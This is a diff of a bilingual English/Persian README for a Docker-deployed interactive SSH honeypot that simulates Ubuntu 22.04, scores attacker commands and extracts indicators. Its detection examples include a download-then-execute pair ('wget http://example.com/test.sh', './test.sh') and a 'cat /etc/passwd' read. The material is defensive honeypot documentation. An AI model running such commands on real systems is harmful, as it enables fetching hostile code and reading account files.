@@ -1,136 +1,1674 @@
-# Fake Ubuntu SSH Honeypot 3.0.1
+# 🐝 Fake Ubuntu SSH Honeypot
 
-یک SSH Honeypot تعاملی و قابل‌استقرار برای شبیه‌سازی Ubuntu Server 22.04 که
-ورودی مهاجم را **هرگز** به shell، process، فایل‌سیستم یا شبکه واقعی تحویل
-نمی‌دهد. تمام commandها و تغییرات فقط داخل state حافظه‌ای همان session هستند.
+**Interactive Ubuntu 22.04 SSH Honeypot with Threat Intelligence, IOC Extraction, Risk Scoring and Hardened Docker Deployment**
 
-## وضعیت نسخه ۳.۰.۱
+**Version:** `3.0.1`  
+**Python:** `>= 3.10`  
+**SSH Engine:** `Paramiko 5.0.0`  
+**Deployment:** Docker / Docker Compose  
+**Logging:** Structured JSONL + SHA-256 Hash Chain  
+**Status:** Production-oriented / Security-hardened
 
-- Paramiko 5.0.0 و dependencyهای hash-locked
-- Host Key پایدار، تزریق‌شده از environment و نگهداری‌شده فقط در RAM
-- Production mode با fail-fast validation
-- rate limit سراسری و per-IP با Token Bucket
-- سقف اتصال هم‌زمان سراسری و per-IP
-- VFS quota برای node، حجم کل، حجم فایل، path و query
-- سقف history، command chain، command count و output
-- JSON logger غیرمسدودکننده با صف محدود
-- پیش‌فرض sha256 برای password؛ plain فقط در Development و redact نیز قابل‌انتخاب است
-- رد صریح SFTP، subsystem، X11، Agent و TCP forwarding
-- حذف الگوریتم‌های قدیمی SSH و فعال‌بودن Strict KEX
-- shutdown صحیح با SIGTERM/SIGINT و flush لاگ‌ها
-- Docker/Compose غیر-root و read-only؛ محدودسازی egress در firewall میزبان/ابر لازم است
-- محدودیت RAM، CPU، PID و file descriptor
-- log rotation، restart policy، CI و dependency audit
-- تحلیل قانون‌محور فرمان‌ها، امتیاز ریسک و خلاصهٔ مستقل برای هر نشست
-- همبستگی دانلود و تلاش برای اجرای همان فایل در یک نشست
-- شاخص‌های محدود و پاک‌سازی‌شده، مراحل رفتار و هشدارهای بدون تکرار
-- ورود آفلاین لاگ JSONL به SQLite و گزارش تجمیعی، بدون ذخیرهٔ پسورد
-- ruleهای regex، confidence، کش محدود per-session و سابقهٔ ساختاریافتهٔ ۵۰۰ فرمان
-- IOCهای IP/domain/URL/MD5/SHA256/file و هش زنجیره‌ای رویدادهای JSONL
-- healthcheck کانتینر و ابزار گزارش متنی آفلاین بدون ذخیرهٔ فرمان‌ها
+---
 
-## معماری
+## 🇬🇧 English
+
+### Overview
+
+**Fake Ubuntu SSH Honeypot** is an interactive SSH deception system designed to simulate an Ubuntu Server 22.04 environment while keeping attacker-controlled input isolated from the real operating system.
+
+The honeypot provides:
+
+- Fake Ubuntu shell
+- Per-session virtual filesystem
+- SSH authentication capture
+- Structured JSONL logging
+- Command intelligence analysis
+- Threat scoring
+- IOC extraction
+- Session behavior correlation
+- Download → execution chain detection
+- Security alerts
+- Log integrity hash chaining
+- Offline log analysis
+- Hardened Docker deployment
+
+> **Important security invariant:** attacker-controlled commands are never intentionally passed to a real host shell, process launcher, filesystem API, DNS resolver, downloader or outbound network client.
+
+Commands such as `wget`, `curl`, `ping`, `apt`, `python3`, `git` and `docker` are **simulated** by the honeypot.
+
+---
+
+# ✨ Main Features
+
+### 🐧 Realistic Ubuntu SSH Environment
+
+The honeypot emulates an Ubuntu Server environment including:
+
+- Ubuntu-style SSH banner
+- Fake hostname
+- Fake users
+- Fake `/etc/passwd`
+- Fake process information
+- Fake networking output
+- Fake filesystem
+- Shell history
+- Ubuntu-like command responses
+- Persistent SSH host key in production
+
+Example:
+
+```text
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-122-generic x86_64)
+
+root@server01:~# whoami
+root
+
+root@server01:~# uname -a
+Linux server01 5.15.0-122-generic ...
+```
+
+---
+
+## 🧠 Threat Intelligence Engine
+
+Every accepted command can be analyzed by the built-in intelligence engine.
+
+Example:
+
+```bash
+wget http://example.com/test.sh
+```
+
+may produce intelligence similar to:
+
+```json
+{
+  "category": "delivery",
+  "risk_score": 35,
+  "risk_level": "medium",
+  "matched_rules": [
+    "payload_download"
+  ]
+}
+```
+
+The engine supports:
+
+- Rule-based detection
+- Parsed command matching
+- Regex detection
+- Confidence scoring
+- Threat scoring
+- Behavior categorization
+- Session-aware correlation
+- IOC extraction
+- Alert deduplication
+- Bounded analysis cache
+
+---
+
+## 🔥 Attack Chain Correlation
+
+The analyzer does not only inspect commands independently.
+
+It keeps bounded per-session intelligence state and can correlate behavior.
+
+Example:
+
+```text
+wget payload.sh
+        ↓
+./payload.sh
+```
+
+can trigger:
+
+```text
+payload_download
+local_payload_execution
+download_then_execute
+```
+
+A correlated execution attempt may receive a critical risk score.
+
+This correlation represents **observed attacker intent**, not proof that a real file was downloaded or executed.
+
+---
+
+## 🎯 Sensitive File Discovery
+
+Access to sensitive account information is detected.
+
+Example:
+
+```bash
+cat /etc/passwd
+```
+
+triggers:
+
+```text
+Rule: passwd_file_access
+Category: discovery
+Score: 20
+```
+
+Similar supported read operations can also be detected when targeting `/etc/passwd`.
+
+---
+
+## 🔎 IOC Extraction
+
+The intelligence engine can extract bounded indicators such as:
+
+- IPv4 addresses
+- Domains
+- URLs
+- File names
+- Artifacts
+- MD5 hashes
+- SHA-256 hashes
+
+Example:
+
+```bash
+wget http://example.com/test.sh
+```
+
+may generate:
+
+```json
+{
+  "hosts": ["example.com"],
+  "files": ["test.sh"],
+  "urls": ["http://example.com/test.sh"]
+}
+```
+
+IOC extraction is intentionally bounded to protect memory and avoid uncontrolled high-cardinality state.
+
+---
+
+## 📊 Threat Scoring
+
+Detections contribute to a command and session threat score.
+
+Threat levels:
+
+| Score | Level |
+|---:|---|
+| `< 10` | NONE |
+| `10–29` | LOW |
+| `30–59` | MEDIUM |
+| `60–89` | HIGH |
+| `90+` | CRITICAL |
+
+The maximum score can be configured through:
+
+```text
+HONEYPOT_MAX_SCORE
+```
+
+Default:
+
+```text
+1000
+```
+
+---
+
+## 🚨 Intelligence Alerts
+
+When a command reaches the configured alert threshold, an `intelligence_alert` event is emitted.
+
+Default threshold:
+
+```text
+65
+```
+
+Configure with:
+
+```dotenv
+HONEYPOT_ALERT_MIN_RISK=65
+```
+
+Alerts are deduplicated per primary rule within the same session.
+
+The alert event does not repeat the complete command text.
+
+---
+
+# 🏗 Architecture
 
 ```mermaid
 flowchart TD
-    A["SSH clients"] --> B["Rate-limited listener"]
-    B --> C["Independent session"]
-    C --> D["Fake commands and VFS"]
-    C --> E["Intelligence analyzer"]
-    D --> F["Async JSONL logger"]
-    E --> F
-    F -.-> G["SQLite report"]
+    A["SSH Client / Scanner / Bot"] --> B["Rate-Limited SSH Listener"]
+    B --> C["Independent Session"]
+    C --> D["Fake Shell"]
+    C --> E["Virtual Filesystem"]
+    C --> F["Intelligence Analyzer"]
+
+    F --> G["Rule Engine"]
+    F --> H["Threat Score"]
+    F --> I["IOC Extraction"]
+    F --> J["Session Correlation"]
+
+    D --> K["Async JSONL Logger"]
+    E --> K
+    F --> K
+
+    K --> L["SHA-256 Integrity Chain"]
+    K -. Offline .-> M["Log Analyzer"]
+    K -. Offline .-> N["SQLite Intelligence Report"]
 ```
 
-تنها ارتباط واقعی، TCP ورودی SSH است. wget، curl، ping، apt، python3، git و
-docker همگی پاسخ ساختگی تولید می‌کنند.
+Each SSH connection receives its own session state.
 
-## ساختار پروژه
+Virtual filesystem content and session intelligence are destroyed when the session ends.
 
-| مسیر | مسئولیت |
+---
+
+# 📁 Project Structure
+
+```text
+SSH-Honeypot/
+│
+├── honeypot/
+│   ├── __main__.py
+│   ├── main.py
+│   ├── config.py
+│   ├── ssh_server.py
+│   ├── shell.py
+│   ├── session.py
+│   ├── commands.py
+│   ├── filesystem.py
+│   ├── fake_data.py
+│   ├── logger.py
+│   ├── rate_limit.py
+│   ├── keygen.py
+│   ├── healthcheck.py
+│   │
+│   ├── intelligence/
+│   │   ├── analyzer.py
+│   │   ├── rules.py
+│   │   ├── patterns.py
+│   │   ├── indicators.py
+│   │   ├── threat_score.py
+│   │   └── cache.py
+│   │
+│   └── security/
+│       └── integrity.py
+│
+├── tools/
+│   ├── analyze_log.py
+│   └── intel_report.py
+│
+├── tests/
+│
+├── Dockerfile
+├── compose.yaml
+├── pyproject.toml
+├── requirements.txt
+├── requirements.lock
+├── requirements-dev.txt
+├── .env.example
+├── SECURITY.md
+├── OPERATIONS.md
+├── CHANGELOG.md
+└── RELEASE.md
+```
+
+---
+
+# 🚀 Quick Start — Docker
+
+Docker Compose is the recommended production deployment method.
+
+## 1. Clone the repository
+
+```bash
+git clone https://github.com/zero19bit/SSH-Honeypot.git
+cd SSH-Honeypot
+```
+
+---
+
+## 2. Build the image
+
+```bash
+docker compose build --pull
+```
+
+Expected image:
+
+```text
+fake-ubuntu-ssh-honeypot:3.0.1
+```
+
+---
+
+## 3. Generate a stable SSH Host Key
+
+Production mode requires a persistent SSH host key.
+
+Generate one with:
+
+```bash
+docker run --rm --entrypoint python \
+  fake-ubuntu-ssh-honeypot:3.0.1 \
+  -m honeypot.keygen > host-key.b64
+```
+
+The generated file contains a single Base64 line.
+
+**Never commit this key to Git.**
+
+---
+
+## 4. Create the environment file
+
+```bash
+cp .env.example .env
+chmod 600 .env
+```
+
+Edit:
+
+```bash
+nano .env
+```
+
+Set:
+
+```dotenv
+HONEYPOT_HOST_KEY_B64=YOUR_ONE_LINE_BASE64_HOST_KEY
+```
+
+Keep the production credential mode as:
+
+```dotenv
+HONEYPOT_CREDENTIAL_LOG_MODE=sha256
+```
+
+Do not place the Base64 host key in `HONEYPOT_CREDENTIAL_LOG_MODE`.
+
+---
+
+## 5. Start the Honeypot
+
+```bash
+docker compose up -d
+```
+
+Check status:
+
+```bash
+docker compose ps
+```
+
+A healthy deployment should eventually show:
+
+```text
+Up ... (healthy)
+```
+
+View logs:
+
+```bash
+docker compose logs --tail=50 honeypot
+```
+
+A successful startup generates a `listener_started` event.
+
+---
+
+## 6. Connect locally
+
+```bash
+ssh -p 2222 \
+  -o PreferredAuthentications=password \
+  -o PubkeyAuthentication=no \
+  root@127.0.0.1
+```
+
+The honeypot intentionally accepts password authentication attempts.
+
+Production logging does **not** store the raw password by default.
+
+---
+
+# 🧪 Example Interaction
+
+```bash
+whoami
+uname -a
+cat /etc/passwd
+wget http://example.com/test.sh
+./test.sh
+exit
+```
+
+These commands are processed inside the simulated environment.
+
+An unsupported fake command may return exit status `127`. This does **not** cause it to execute on the host.
+
+---
+
+# 💻 Development Mode
+
+For local development without Docker:
+
+```bash
+python3 -m venv .venv
+source .venv/bin/activate
+```
+
+Install locked runtime dependencies:
+
+```bash
+python -m pip install --require-hashes -r requirements.lock
+```
+
+Run:
+
+```bash
+python -m honeypot \
+  --development \
+  --host 127.0.0.1 \
+  --port 2222
+```
+
+Development mode generates a temporary RSA host key.
+
+Production mode requires:
+
+```text
+HONEYPOT_HOST_KEY_B64
+```
+
+If port `2222` is already used:
+
+```bash
+python -m honeypot \
+  --development \
+  --host 127.0.0.1 \
+  --port 2223
+```
+
+Then connect using:
+
+```bash
+ssh -p 2223 root@127.0.0.1
+```
+
+---
+
+# 🧰 Simulated Commands
+
+The honeypot includes fake implementations for common Linux commands.
+
+| Category | Commands |
 |---|---|
-| honeypot/main.py | CLI، environment، signal handling و lifecycle |
-| honeypot/config.py | تنظیمات validate‌شده و Production gates |
-| honeypot/ssh_server.py | SSH، Host Key، thread lifecycle و رد forwarding |
-| honeypot/rate_limit.py | Token Bucket و سقف connection |
-| honeypot/session.py | state مستقل هر اتصال |
-| honeypot/shell.py | PTY و line editor |
-| honeypot/filesystem.py | فایل‌سیستم مجازی با quota |
-| honeypot/commands.py | parser و پاسخ‌های fake |
-| honeypot/logger.py | JSONL async و bounded |
-| honeypot/intelligence/rules.py | قوانین قابل بررسی و دسته‌بندی تلاش‌های مهاجم |
-| honeypot/intelligence/analyzer.py | تحلیل فرمان و خلاصهٔ هر نشست |
-| honeypot/intelligence/indicators.py | استخراج IOCهای محدود و پاک‌سازی‌شده |
-| honeypot/intelligence/patterns.py, cache.py, threat_score.py | regex، کش محدود و موتور امتیاز |
-| honeypot/security/integrity.py | زنجیرهٔ هش JSONL |
-| tools/analyze_log.py | گزارش آفلاین و بررسی یکپارچگی لاگ |
-| tools/intel_report.py | ورود و گزارش SQLite؛ جدا از سرور SSH |
-| honeypot/fake_data.py | داده‌های ساختگی Ubuntu |
-| honeypot/keygen.py | تولید Host Key یک‌خطی برای environment |
-| compose.yaml | استقرار hardened |
-| SECURITY.md | مدل امنیتی |
-| OPERATIONS.md | Runbook کامل Production |
+| System | `whoami`, `id`, `hostname`, `uname`, `uptime`, `date`, `history` |
+| Filesystem | `ls`, `ll`, `cd`, `pwd`, `cat`, `head`, `tail`, `find`, `touch`, `mkdir`, `rm`, `nano`, `vim` |
+| Networking | `ip`, `ifconfig`, `netstat`, `ss`, `ping` |
+| Resources | `ps`, `top`, `free`, `df`, `du` |
+| Management | `systemctl`, `service`, `apt`, `apt-get` |
+| Tools | `wget`, `curl`, `python3`, `git`, `docker`, `docker compose` |
 
-## سریع‌ترین اجرای محلی با Docker
+The internal parser also supports bounded command chains including:
 
-### ۱. ساخت Image
+```text
+;
+&&
+||
+|
+```
 
-    docker compose build --pull
+and pipelines involving utilities such as:
 
-### ۲. تولید Host Key پایدار
+```text
+grep
+head
+tail
+```
 
-    docker run --rm --entrypoint python \
-      fake-ubuntu-ssh-honeypot:3.0.1 \
-      -m honeypot.keygen > host-key.b64
+No real shell is used to execute these chains.
 
-### ۳. تنظیم environment
+---
 
-    cp .env.example .env
-    chmod 600 .env
+# 🧱 Virtual Filesystem
 
-مقدار یک‌خطی host-key.b64 را مقابل HONEYPOT_HOST_KEY_B64 قرار دهید.
+Every session receives an independent in-memory virtual filesystem.
 
-### ۴. اجرا
+Default limits include:
 
-    docker compose up -d
-    docker compose ps
-    docker compose logs --tail=50 honeypot
+```text
+Maximum VFS nodes:       2048
+Maximum total VFS size:  2 MiB
+Maximum file size:       128 KiB
+Maximum path length:     512
+Maximum name length:     255
+```
 
-### ۵. تست
+The virtual filesystem never writes attacker-controlled files to the host filesystem.
 
-    ssh -p 2222 \
-      -o PreferredAuthentications=password \
-      -o PubkeyAuthentication=no \
-      root@127.0.0.1
+Session VFS data is destroyed when the session terminates.
 
-هر password پذیرفته می‌شود؛ تلاش‌های احراز هویت در حالت پیش‌فرض فقط با هش
-`sha256` و طول رمز ثبت می‌شوند. Exec request بات‌ها نیز پشتیبانی می‌شود:
+---
 
-    ssh -p 2222 root@127.0.0.1 'cd /var/log && pwd && tail -n 1 auth.log'
+# 🔐 Credential Logging
 
-برای انتشار عمومی، ابتدا firewall خروجی کانتینر را روی میزبان/ابر مسدود
-و بررسی کنید، سپس `HONEYPOT_PUBLIC_BIND=0.0.0.0` را در `.env` قرار دهید.
-پیش‌فرض جدید `127.0.0.1` است؛ `.env` نسخهٔ قبلی در صورت داشتن مقدار
-`0.0.0.0` باید دستی بازبینی شود.
+Three credential logging modes exist:
 
-## اجرای مستقیم برای Development
+### `sha256`
 
-Production توصیه می‌شود فقط با Compose اجرا شود. برای تست محلی:
+Default production mode.
 
-    python3 -m venv .venv
-    source .venv/bin/activate
-    python -m pip install --require-hashes -r requirements.lock
-    python -m honeypot --development --host 127.0.0.1 --port 2222
+Stores:
 
-اگر پورت ۲۲۲۲ اشغال بود، `--port 2223` بگذارید و SSH را نیز با `-p 2223`
-وصل کنید.
+```json
+{
+  "password_sha256": "...",
+  "password_length": 12
+}
+```
 
-Development یک Host Key موقت ۳۰۷۲ بیتی می‌سازد. Production بدون
-HONEYPOT_HOST_KEY_B64 اجرا نمی‌شود.
+It does not store the plaintext password.
 
-## تست و Audit
+---
 
-از ریشهٔ پروژه اجرا کنید:
+### `redact`
+
+Stores only metadata such as password length.
+
+Recommended when password digests are unnecessary.
+
+---
+
+### `plain`
+
+Stores attempted passwords in plaintext.
+
+⚠️ **Development only.**
+
+Production mode rejects:
+
+```dotenv
+HONEYPOT_CREDENTIAL_LOG_MODE=plain
+```
+
+Raw commands can still contain credentials or tokens, so logs must always be treated as sensitive data.
+
+---
+
+# 📝 Structured Logging
+
+Runtime events are written as JSON Lines.
+
+Important events include:
+
+```text
+listener_started
+connection_open
+ssh_negotiated
+authentication
+shell_open
+command
+intelligence_alert
+connection_rejected
+runtime_metrics
+disconnect
+startup_failed
+analyzer_error
+```
+
+Example command event:
+
+```json
+{
+  "event": "command",
+  "session_id": "...",
+  "attacker_ip": "...",
+  "command": "uname -a",
+  "threat": {
+    "score": 15,
+    "severity": "LOW"
+  },
+  "analysis": {
+    "category": "reconnaissance",
+    "matched_rules": [
+      "system_discovery"
+    ]
+  }
+}
+```
+
+---
+
+# 🔗 Log Integrity
+
+Version `3.0.1` supports SHA-256 hash chaining.
+
+Each log entry contains:
+
+```json
+{
+  "integrity": {
+    "algorithm": "sha256",
+    "prev_hash": "...",
+    "hash": "..."
+  }
+}
+```
+
+This allows modifications or missing records inside a collected process log to be detected.
+
+It is **not a cryptographic signature**.
+
+An attacker who can completely rewrite the log and recompute every hash could construct a new chain.
+
+For production environments, retain immutable or remote log copies.
+
+---
+
+# 📥 Export JSONL Logs
+
+Export Docker logs:
+
+```bash
+docker compose logs \
+  --no-color \
+  --no-log-prefix \
+  honeypot > honeypot.jsonl
+```
+
+---
+
+# 🔍 Offline Log Analysis
+
+Analyze a collected JSONL file:
+
+```bash
+python3 tools/analyze_log.py honeypot.jsonl
+```
+
+JSON output:
+
+```bash
+python3 tools/analyze_log.py honeypot.jsonl --json
+```
+
+The tool can validate the integrity chain for a single process run.
+
+Old logs without integrity hashes are reported as:
+
+```text
+UNVERIFIED
+```
+
+---
+
+# 🗄 Offline SQLite Intelligence Database
+
+Import logs into SQLite:
+
+```bash
+python3 tools/intel_report.py \
+  ingest honeypot.jsonl \
+  --db intel.sqlite
+```
+
+Generate a report:
+
+```bash
+python3 tools/intel_report.py \
+  report \
+  --db intel.sqlite
+```
+
+JSON report:
+
+```bash
+python3 tools/intel_report.py \
+  report \
+  --db intel.sqlite \
+  --json
+```
+
+By default, the intelligence database does **not** store plaintext passwords.
+
+Raw command storage is also disabled unless explicitly requested.
+
+To include raw commands:
+
+```bash
+python3 tools/intel_report.py \
+  ingest honeypot.jsonl \
+  --db intel.sqlite \
+  --include-commands
+```
+
+If `--include-commands` is used, protect the SQLite file as sensitive evidence.
+
+---
+
+# ⚙️ Important Configuration
+
+Configuration is provided through environment variables.
+
+| Variable | Default | Description |
+|---|---:|---|
+| `HONEYPOT_HOST_KEY_B64` | Required in Production | Base64 encoded RSA host private key |
+| `HONEYPOT_PUBLIC_BIND` | `127.0.0.1` | Published host address |
+| `HONEYPOT_PUBLIC_PORT` | `2222` | Published SSH port |
+| `HONEYPOT_HOSTNAME` | `server01` | Fake server hostname |
+| `HONEYPOT_CREDENTIAL_LOG_MODE` | `sha256` | Credential capture mode |
+| `HONEYPOT_ALERT_MIN_RISK` | `65` | Intelligence alert threshold |
+| `HONEYPOT_INTELLIGENCE_ENABLED` | `true` | Enable command intelligence |
+| `HONEYPOT_IOC_ENABLED` | `true` | Enable IOC extraction |
+| `HONEYPOT_LOG_HASHING` | `true` | Enable JSONL hash chaining |
+| `HONEYPOT_MAX_SESSION_HISTORY` | `500` | Intelligence history size |
+| `HONEYPOT_MAX_SCORE` | `1000` | Maximum accumulated score |
+| `HONEYPOT_MAX_CONNECTIONS` | `64` | Global active connection limit |
+| `HONEYPOT_MAX_CONNECTIONS_PER_IP` | `4` | Per-source connection limit |
+| `HONEYPOT_IP_RATE_PER_MINUTE` | `12` | Per-IP admission rate |
+| `HONEYPOT_MAX_SESSION_SECONDS` | `900` | Maximum session lifetime |
+| `HONEYPOT_VFS_MAX_NODES` | `2048` | Virtual filesystem node limit |
+| `HONEYPOT_VFS_MAX_TOTAL_BYTES` | `2097152` | Virtual filesystem size limit |
+
+See `.env.example` and `honeypot/config.py` for the full configuration set.
+
+---
+
+# 🛡 Docker Hardening
+
+The provided Compose configuration includes:
+
+- Numeric non-root user
+- Read-only root filesystem
+- All Linux capabilities dropped
+- `no-new-privileges`
+- `/tmp` mounted with `noexec`, `nosuid` and `nodev`
+- CPU limit
+- RAM limit
+- PID limit
+- File descriptor limits
+- Log rotation
+- Restart policy
+- Healthcheck
+- Graceful `SIGTERM` shutdown
+
+The honeypot application itself does not intentionally create outbound connections from attacker commands.
+
+However:
+
+> The supplied Docker bridge is currently **not an egress firewall**.
+
+Before exposing the service to the Internet, block container outbound traffic using the host firewall or cloud network policy.
+
+---
+
+# 🌐 Public Deployment
+
+By default the service binds to:
+
+```text
+127.0.0.1
+```
+
+For public exposure, first establish outbound firewall restrictions.
+
+Then change:
+
+```dotenv
+HONEYPOT_PUBLIC_BIND=0.0.0.0
+```
+
+Restart:
+
+```bash
+docker compose up -d
+```
+
+### Using public port 22
+
+Do **not** move the honeypot to port `22` until your real administrative SSH access has been moved elsewhere.
+
+After securing management access:
+
+```dotenv
+HONEYPOT_PUBLIC_PORT=22
+```
+
+The application still runs internally as an unprivileged user on port `2222`; Docker performs host port publishing.
+
+---
+
+# 🧪 Testing
+
+Create a development environment:
+
+```bash
+python3 -m venv .venv
+source .venv/bin/activate
+```
+
+Install development dependencies:
+
+```bash
+pip install -r requirements-dev.txt
+```
+
+Run the complete test suite:
+
+```bash
+pytest -q
+```
+
+or:
+
+```bash
+make test
+```
+
+Build Docker:
+
+```bash
+make docker
+```
+
+---
+
+# 🔍 Dependency Audit
+
+Run:
+
+```bash
+pip-audit -r requirements.lock
+```
+
+Runtime dependencies are exact-pinned with hashes in:
+
+```text
+requirements.lock
+```
+
+CI should run:
+
+1. Tests
+2. Dependency audit
+3. Fresh container build
+
+before release.
+
+---
+
+# ❤️ Healthcheck
+
+The Docker container includes an internal healthcheck.
+
+Check:
+
+```bash
+docker compose ps
+```
+
+Expected:
+
+```text
+healthy
+```
+
+The healthcheck performs a local TCP connection to the SSH listener.
+
+Because of this, occasional short-lived SSH transport errors from local container health probes may appear in logs.
+
+---
+
+# 🧯 Troubleshooting
+
+## Container keeps restarting
+
+Check:
+
+```bash
+docker compose logs --tail=100 honeypot
+```
+
+---
+
+### `HONEYPOT_HOST_KEY_B64 is required in production mode`
+
+Your production Host Key is missing.
+
+Generate:
+
+```bash
+docker run --rm --entrypoint python \
+  fake-ubuntu-ssh-honeypot:3.0.1 \
+  -m honeypot.keygen > host-key.b64
+```
+
+Put the generated Base64 line in:
+
+```dotenv
+HONEYPOT_HOST_KEY_B64=...
+```
+
+---
+
+### `credential_log_mode must be plain, sha256, or redact`
+
+Check `.env`.
+
+Correct:
+
+```dotenv
+HONEYPOT_CREDENTIAL_LOG_MODE=sha256
+```
+
+Incorrect:
+
+```dotenv
+HONEYPOT_CREDENTIAL_LOG_MODE=<BASE64 PRIVATE KEY>
+```
+
+The Base64 private key belongs in:
+
+```dotenv
+HONEYPOT_HOST_KEY_B64=
+```
+
+---
+
+## Port 2222 is already allocated
+
+Check:
+
+```bash
+docker ps
+```
+
+Stop the old honeypot:
+
+```bash
+docker stop <container-name>
+```
+
+or change:
+
+```dotenv
+HONEYPOT_PUBLIC_PORT=2223
+```
+
+Then:
+
+```bash
+docker compose up -d
+```
+
+Connect:
+
+```bash
+ssh -p 2223 root@127.0.0.1
+```
+
+---
+
+## `REMOTE HOST IDENTIFICATION HAS CHANGED`
+
+This commonly happens after changing the honeypot Host Key.
+
+Remove the old local fingerprint:
+
+```bash
+ssh-keygen \
+  -f ~/.ssh/known_hosts \
+  -R '[127.0.0.1]:2222'
+```
+
+Reconnect and verify the new fingerprint.
+
+---
+
+## Existing Docker network warning
+
+You may see:
+
+```text
+a network with name fake-ssh-honeynet exists
+but was not created for this project
+```
+
+This usually means an older honeypot Compose project created the same named network.
+
+Inspect it before changing anything:
+
+```bash
+docker network inspect fake-ssh-honeynet
+```
+
+If it belongs only to an old deployment and is no longer required:
+
+```bash
+docker network rm fake-ssh-honeynet
+```
+
+Do not remove a network currently used by other containers.
+
+---
+
+## Docker Hub returns `403 Forbidden`
+
+Authenticate:
+
+```bash
+docker login
+```
+
+Test the base image:
+
+```bash
+docker pull python:3.12-slim-bookworm
+```
+
+Then rebuild:
+
+```bash
+docker compose build
+```
+
+---
+
+# 🔒 Security Model
+
+The core security invariant is:
+
+> **Attacker-controlled input must never reach a real shell, process launcher, host filesystem or outbound network client.**
+
+The actual attack surface is intentionally limited primarily to:
+
+- Inbound TCP listener
+- Paramiko
+- Python runtime
+- Configuration parser
+- Structured logging
+
+If any attacker-controlled input is found to:
+
+- launch a real process;
+- modify a real host file;
+- read a real host file;
+- initiate an outbound connection;
+
+treat it as a **critical security vulnerability** and remove the deployment from the network until fixed.
+
+---
+
+# ⚠️ Deployment Recommendations
+
+For Internet-facing deployments:
+
+- Use a dedicated VPS or VM.
+- Do not run beside production workloads.
+- Do not run the process as root.
+- Do not expose your real management SSH on the same public endpoint.
+- Restrict management through VPN, private interface or allowlisted access.
+- Block outbound container traffic at host/cloud level.
+- Protect and rotate logs.
+- Keep the Host Key private.
+- Keep `.env` outside version control.
+- Keep immutable or remote log backups.
+- Run tests and dependency audits before upgrades.
+
+---
+
+# 🚫 Files That Must Never Be Committed
+
+Keep the following out of Git:
+
+```text
+.env
+.venv/
+host-key.b64
+honeypot_host_key
+honeypot_host_key.pub
+*.log
+*.jsonl
+__pycache__/
+.pytest_cache/
+```
+
+Never commit a production SSH private key.
+
+---
+
+# 🔄 Safe Upgrade Procedure
+
+Before upgrading:
+
+```bash
+pytest -q
+pip-audit -r requirements.lock
+docker compose build --pull --no-cache
+```
+
+Export important logs.
+
+Preserve the existing Host Key if you want clients to see the same SSH fingerprint after upgrading.
+
+Deploy:
+
+```bash
+docker compose up -d
+```
+
+Verify:
+
+```bash
+docker compose ps
+docker compose logs --tail=50 honeypot
+```
+
+Look for:
+
+```text
+listener_started
+```
+
+and confirm the expected host-key fingerprint.
+
+---
+
+# 🛑 Shutdown
+
+Graceful shutdown:
+
+```bash
+docker compose down --timeout 15
+```
+
+The service handles `SIGTERM`, closes listeners and active sockets, allows worker threads to exit and flushes queued logs.
+
+The virtual filesystem exists only in memory and disappears when sessions or containers terminate.
+
+---
+
+# ⚖️ Responsible Use
+
+This project is intended for:
+
+- Defensive security research
+- Honeypot experimentation
+- Threat intelligence collection
+- Cybersecurity education
+- Controlled laboratory environments
+- Authorized monitoring
+
+Deploy only on infrastructure you own or are authorized to monitor.
+
+Depending on jurisdiction, collection of credentials, IP addresses, command history or other attacker data may have legal and privacy implications.
+
+You are responsible for complying with applicable laws and policies.
+
+---
+
+# 📚 Additional Documentation
+
+More detailed documentation is available in:
+
+```text
+SECURITY.md
+OPERATIONS.md
+CHANGELOG.md
+RELEASE.md
+```
+
+---
+
+# 🧩 Version
+
+Current release:
+
+```text
+v3.0.1
+```
+
+Runtime:
+
+```bash
+python -m honeypot --version
+```
+
+---
+
+# 🇮🇷 فارسی
+
+## معرفی پروژه
+
+**Fake Ubuntu SSH Honeypot** یک هانی‌پات تعاملی SSH است که محیطی مشابه **Ubuntu Server 22.04** در اختیار مهاجم، اسکنر یا Bot قرار می‌دهد؛ بدون اینکه دستورات ورودی به Shell واقعی سیستم، Processهای واقعی، فایل‌سیستم میزبان یا Downloader واقعی منتقل شوند.
+
+هدف پروژه این است که بتوان رفتار مهاجم را در یک محیط کنترل‌شده مشاهده، ثبت و تحلیل کرد.
+
+نسخه `3.0.1` علاوه بر شبیه‌سازی SSH، دارای یک **Threat Intelligence Engine داخلی** است که می‌تواند دستورات را تحلیل کند، رفتارها را دسته‌بندی کند، IOC استخراج کند و برای فعالیت‌های پرریسک هشدار تولید کند.
+
+---
+
+# ⭐ قابلیت‌ها
+
+نسخه فعلی شامل موارد زیر است:
+
+- شبیه‌سازی Ubuntu Server 22.04
+- SSH Server مبتنی بر Paramiko
+- Fake Shell تعاملی
+- Virtual Filesystem مستقل برای هر Session
+- ثبت Authentication Attempt
+- JSONL Logging
+- Threat Intelligence Engine
+- Rule Engine
+- Regex Detection
+- Threat Scoring
+- Confidence Scoring
+- IOC Extraction
+- Session Behavior Tracking
+- Attack Chain Correlation
+- Intelligence Alert
+- SHA-256 Log Integrity Chain
+- Rate Limiting
+- Connection Limiting
+- Session Timeout
+- VFS Quota
+- Docker Hardening
+- Offline Log Analyzer
+- SQLite Intelligence Report
+- Healthcheck
+- CI و Dependency Audit
+
+---
+
+# 🧠 موتور هوشمندی
+
+هر فرمانی که داخل Session اجرا شود می‌تواند توسط Analyzer بررسی شود.
+
+برای مثال:
+
+```bash
+whoami
+```
+
+ممکن است به شکل زیر تشخیص داده شود:
+
+```text
+system_discovery
+reconnaissance
+LOW
+```
+
+یا:
+
+```bash
+wget http://example.com/test.sh
+```
+
+به عنوان:
+
+```text
+payload_download
+delivery
+MEDIUM
+```
+
+تحلیل شود.
+
+---
+
+# 🔥 تشخیص زنجیره حمله
+
+Analyzer فقط یک Command را جداگانه بررسی نمی‌کند.
+
+اطلاعات محدود Session را نگه می‌دارد.
+
+مثلاً:
+
+```text
+wget test.sh
+      ↓
+./test.sh
+```
+
+می‌تواند باعث تشخیص:
+
+```text
+download_then_execute
+```
+
+شود.
+
+این تشخیص به معنی اجرای واقعی Malware نیست؛ فقط نشان‌دهنده **رفتار مشاهده‌شده و Intent احتمالی مهاجم** است.
+
+---
+
+# 🎯 تشخیص دسترسی به `/etc/passwd`
+
+دستور:
+
+```bash
+cat /etc/passwd
+```
+
+Rule زیر را فعال می‌کند:
+
+```text
+passwd_file_access
+```
+
+با مشخصات:
+
+```text
+Category: discovery
+Score: 20
+Threat: LOW
+```
+
+---
+
+# 🔎 استخراج IOC
+
